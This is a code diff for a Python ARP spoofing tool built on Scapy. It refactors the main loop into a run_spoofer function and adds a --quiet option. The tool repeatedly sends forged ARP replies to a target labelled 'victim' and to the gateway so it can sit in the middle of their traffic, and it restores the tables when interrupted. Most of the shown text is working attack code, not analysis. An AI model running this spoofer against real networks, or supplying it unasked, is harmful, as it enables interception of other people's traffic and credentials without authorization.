@@ -36,15 +36,7 @@ def restore(dest_ip, src_ip):
     )
     scapy.sendp(packet, count=4, verbose=False)
 
-def main():
-    parser = argparse.ArgumentParser(description="ARP Spoofer using Scapy")
-    parser.add_argument("-t", "--target", required=True, help="Target IP Address (victim)")
-    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP Address (router)")
-
-    args = parser.parse_args()
-    target_ip = args.target
-    gateway_ip = args.gateway
-
+def run_spoofer(target_ip, gateway_ip, quiet=False):
     print(f"[+] Spoofing {target_ip} <--> {gateway_ip} ... Press CTRL+C to stop.")
     sent_packet_count = 0
 
@@ -53,13 +45,23 @@ def main():
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
             sent_packet_count += 2
-            print("\r[+] Packets sent: " + str(sent_packet_count), end="")
+            if not quiet and sent_packet_count % 10 == 0:
+                print(f"[+] Packets sent: {sent_packet_count}")
             time.sleep(2)
     except KeyboardInterrupt:
         print("\n[+] Detected CTRL+C ... Restoring ARP tables. Please wait...")
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
         print("[+] ARP tables restored. Exiting.")
+
+def main():
+    parser = argparse.ArgumentParser(description="ARP Spoofer using Scapy")
+    parser.add_argument("-t", "--target", required=True, help="Target IP Address (victim)")
+    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP Address (router)")
+    parser.add_argument("--quiet", action="store_true", help="Suppress output of packet count")
+
+    args = parser.parse_args()
+    run_spoofer(args.target, args.gateway, args.quiet)
 
 if __name__ == "__main__":
     main()
